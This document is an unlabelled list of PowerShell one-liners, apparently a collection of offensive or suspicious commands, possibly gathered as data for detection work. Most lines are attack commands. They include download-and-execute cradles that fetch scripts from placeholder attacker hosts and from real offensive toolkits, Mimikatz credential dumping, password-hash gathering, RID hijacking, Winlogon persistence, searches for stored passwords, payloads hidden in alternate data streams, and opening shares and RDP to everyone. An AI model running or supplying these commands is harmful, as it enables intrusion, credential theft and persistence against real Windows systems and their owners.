Invoke-CredentialPhisher
Invoke-Expression -Command "IEX(New-Object Net.WebClient).DownloadString('http://hacker.com/bad.ps1')"
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://maliciouswebsite.com/maliciousscript.ps1')"
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')
ls -recurse ; get-childitem -recurse ; gci -recurse
$Invoke = {IEX (New-Object Net.WebClient).DownloadString('http://malicious.url/malicious_script.ps1')}; Invoke-Command -ScriptBlock $Invoke
powershell -exec bypass -command "Invoke-Mimikatz -DumpCreds"
powershell.exe -c "Get-CimInstance -class win32_operatingsystem | select -property * | export-csv msdebug.log"
powershell -ep bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1');"
Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://badwebserver.com/SysWin.ps1')"
Invoke-WebRequest -Url http://malicious-server.com/malicious-file.exe -OutFile C:\malicious-file.exe
Invoke-RIDHijacking -User unina -RID 500
powershell.exe -nop -w hidden -c "IEX ((New-Object Net.WebClient).DownloadString('http://evilurl.com/evil.ps1'))";
powershell -ep bypass -c "Invoke-Mimikatz"
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')
Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://badwebserver.com/SysWin.ps1')"
powershell.exe -exec bypass -nop -c "IEX (New-Object Net.WebClient).DownloadString('https://malicious-website.com/malicious.ps1')"
Get-BrowserInformation -Browser All -Datatype History -UserName Luca -Search 'wikipedia'
powershell.exe -ep bypass -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://exploitingurl.com/execKern.ps1')"
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command {Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-server.com/malicious-script.ps1')}
Get-CimInstance Win32_Group
Get-Date -UFormat '+%Y-%m-%dT%H:%M:%SZ'
$payload = [System.Text.Encoding]::Unicode.GetBytes("Invoke-Mimikatz")
powershell.exe -exec bypass -c "Invoke-Mimikatz"
$payload = 'IEX (New-Object Net.WebClient).DownloadString("http://somesurl.com/juve.ps1")'; Invoke-Expression $payload
Get-CimInstance -Class Win32_UserAccount
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "IEX (Invoke-WebRequest -Uri 'http://HeavySite.com/script.ps1').Content"
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, ${binaryToExec}" -Force
dir
$pattern = "password";$hives = "HKEY_CURRENT_USER","HKEY_LOCAL_MACHINE","HKEY_USERS","HKEY_CURRENT_CONFIG";foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | sls "$pattern" };foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | % { if((gp $_.PsPath -ea SilentlyContinue) -match "$pattern") { $_.PsPath; $_ | out-string -stream | sls "$pattern" }}}
$originalString = 'SensitiveCommand'; $obfuscatedString = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($originalString)); $decodedString = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($obfuscatedString)); InvokeExpression $decodedString
iex(iwr("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1"));Get-PassHashes
Get-NetGPO -GPOName '{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}'
netsh interface portproxy add v4tov4 listenport=5446 listenaddress=10.35.8.17 connectport=5985 connectaddress=10.35.8.23
gci C:\Users\unina\Desktop -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password"
Find-DomainShare -CheckShareAccess
$net = "10.10.1.";0..255 | foreach {$r=(Resolve-DNSname -ErrorAction SilentlyContinue $net$_ | ft NameHost -HideTableHeaders | Out-String).trim().replace("\s+","").replace("`r","").replace("`n"," "); Write-Output "$net$_ $r"} | tee ip_hostname.txt
new-item "c:\users\public\share" -itemtype directory;New-SmbShare -Name "sharedir" -Path "C:\users\public\share" -FullAccess "Everyone","Guests","Anonymous Logon"
$content = 'Invoke-Mimikatz'; $file = 'C:\normal.txt'; $stream = 'C:\normal.txt:hidden'; Set-Content -Path $file -Value 'This is a normal file'; Add-Content -Path $stream -Value $content; Get-Content -Path $stream
([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
$path = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVGVtcFxBZG1pblRvb2xz')); Invoke-Item $path
Get-ForestGlobalCatalog
Add-Type -TypeDefinition 'using System; public class MyClass { public static void Run() { Console.WriteLine("Executed"); } }'; [MyClass]::Run()
Get-NetFirewallRule -DisplayGroup "Remote Desktop" | Set-NetFirewallRule -Enabled True
